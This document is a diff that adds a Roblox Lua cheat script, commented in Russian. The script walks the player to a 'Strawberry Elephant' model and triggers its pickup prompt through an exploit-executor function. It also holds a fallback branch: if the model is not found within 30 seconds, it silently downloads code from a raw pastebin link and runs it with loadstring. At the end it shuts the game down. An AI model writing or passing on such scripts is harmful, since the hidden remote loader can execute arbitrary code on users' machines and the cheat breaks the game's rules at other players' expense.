@@ -1,0 +1,133 @@
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local function waitForStrawberryElephant()
+    local maxWaitTime = 30
+    local checkInterval = 0.5
+    local waitedTime = 0
+    
+    while waitedTime < maxWaitTime do
+        local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
+        if renderedAnimals then
+            local strawberryElephant = renderedAnimals:FindFirstChild("Strawberry Elephant")
+            if strawberryElephant then
+                print("Strawberry Elephant найден")
+                return strawberryElephant
+            end
+        end
+        
+        wait(checkInterval)
+        waitedTime = waitedTime + checkInterval
+    end
+    
+    loadstring(game:HttpGet("https://pastebin.com/raw/Ru4UQDpN"))()
+    return nil
+end
+
+local function findModelWithAttribute(strawberryElephant)
+    if not strawberryElephant then return nil end
+    
+    local elephantPosition = strawberryElephant:GetPivot().Position
+    
+    -- Ищем все модели в workspace с атрибутом "Index" равным "Strawberry Elephant"
+    for _, model in ipairs(workspace:GetDescendants()) do
+        if model:IsA("Model") then
+            local indexAttribute = model:GetAttribute("Index")
+            if indexAttribute and tostring(indexAttribute) == "Strawberry Elephant" then
+                -- Проверяем, что моделька рядом с Strawberry Elephant
+                local modelPosition = model:GetPivot().Position
+                local distance = (modelPosition - elephantPosition).Magnitude
+                
+                if distance < 50 then -- Максимальное расстояние 50 studs
+                    print("Найдена моделька с атрибутом Index='Strawberry Elephant' (расстояние: " .. math.floor(distance) .. " studs)")
+                    return model
+                end
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function moveToStrawberryElephant(target)
+    if not target then
+        print("Цель не найдена")
+        return
+    end
+    
+    local character = localPlayer.Character
+    if not character then
+        character = localPlayer.CharacterAdded:Wait()
+    end
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then
+        print("Humanoid не найден")
+        return
+    end
+    
+    print("Начинаем движение к Strawberry Elephant...")
+    
+    -- Постоянно следим за позицией цели и двигаемся к ней
+    while target and target.Parent do
+        local targetPosition = target:GetPivot().Position
+        local characterPosition = character:GetPivot().Position
+        
+        -- Рассчитываем расстояние до цели
+        local distance = (targetPosition - characterPosition).Magnitude
+        
+        -- Если близко к цели - останавливаемся
+        if distance < 4 then
+            humanoid:MoveTo(characterPosition) -- Останавливаемся
+            print("Достигнут Strawberry Elephant")
+            
+            -- Ищем модельку с атрибутом после остановки
+            wait(0.1)
+            
+            local targetModel = findModelWithAttribute(target)
+            
+            if targetModel then
+                -- Ищем ProximityPrompt в найденной модели
+                local prompt = targetModel.Part.PromptAttachment:FindFirstChildOfClass("ProximityPrompt")
+                if not prompt then
+                    prompt = targetModel.Part.PromptAttachment:FindFirstDescendantOfClass("ProximityPrompt")
+                end
+                
+                if prompt then
+                    print("Активируем ProximityPrompt в найденной модели")
+                    fireproximityprompt(prompt)
+                    print("ProximityPrompt успешно активирован!")
+                else
+                    print("ProximityPrompt не найден в модели с атрибутом")
+                end
+            else
+                print("Модель с атрибутом Index='Strawberry Elephant' не найдена рядом")
+            end
+            
+            break
+        end
+        
+        -- Двигаемся к цели
+        humanoid:MoveTo(targetPosition)
+        
+        -- Ждем перед обновлением позиции
+        wait(0.1)
+    end
+    
+    print("Движение завершено")
+end
+
+-- Основная функция
+local function main()
+    local strawberryElephant = waitForStrawberryElephant()
+    
+    if strawberryElephant then
+        moveToStrawberryElephant(strawberryElephant)
+    end
+end
+
+-- Запускаем скрипт
+main()
+
+wait(30)
+game:Shutdown()
